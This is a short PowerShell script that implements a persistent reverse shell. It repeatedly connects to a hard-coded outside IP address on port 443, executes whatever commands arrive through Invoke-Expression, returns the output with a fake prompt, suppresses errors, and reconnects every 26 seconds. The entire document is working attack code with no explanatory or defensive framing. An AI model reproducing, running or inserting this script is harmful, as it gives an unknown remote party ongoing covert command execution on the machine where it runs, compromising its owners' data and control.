while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("200.28.162.248",443)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $buffer = New-Object Byte[] 1024
        $encoding = New-Object System.Text.ASCIIEncoding

        while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
            $data = $encoding.GetString($buffer,0, $i)
            $sendback = (Invoke-Expression $data | Out-String )
            $sendback2  = $sendback + "PS " + (pwd).Path + "> "
            $writer.Write($sendback2)
            $writer.Flush()
        }

        $client.Close()
    }
    catch {
        # opcional: escribir el error si quieres debug
        # Write-Host "Error: $_"
    }
    Start-Sleep -Seconds 26
}
